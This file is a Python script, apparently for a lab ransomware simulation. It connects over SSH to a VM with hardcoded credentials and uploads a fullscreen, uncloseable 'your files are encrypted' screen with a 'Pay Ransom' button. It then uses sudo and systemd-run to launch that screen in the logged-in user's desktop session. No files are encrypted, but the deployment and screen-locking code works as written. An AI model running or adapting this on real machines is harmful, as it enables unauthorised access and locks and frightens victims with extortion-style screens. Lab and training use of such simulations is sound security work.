#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # The Tkinter Payload
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True) 
root.configure(background='black')
root.overrideredirect(True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI using systemd-run (Wayland Bypass)...")
        
        # First, let's verify the CEO user actually has an active graphical session
        # loginctl lists sessions. We look for the active seat.
        stdin, stdout, stderr = ssh.exec_command("loginctl list-sessions --no-legend | grep 'seat0' | awk '{print $1}' | head -n 1")
        session_id = stdout.read().decode().strip()
        
        if not session_id:
            print("[-] Could not find an active GUI session for CEO on seat0.")
            print("    Make sure the CEO account is physically logged into the Kali desktop.")
            ssh.close()
            sys.exit(1)
            
        print(f"[+] Found active GUI session ID: {session_id}")

        # Use systemd-run to launch the script inside the active session environment
        # We use --uid=CEO to ensure it runs as the CEO user
        exec_cmd = f"sudo systemd-run --uid={USERNAME} --session --setenv=DISPLAY=:0 --setenv=WAYLAND_DISPLAY=wayland-0 python3 /tmp/ransom_sim.py"
        
        stdin, stdout, stderr = ssh.exec_command(f"echo '{PASSWORD}' | sudo -S {exec_cmd}")
        
        # We don't wait for the output because systemd-run will hold the SSH connection open 
        # until the GUI app closes. We just fire and forget.
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
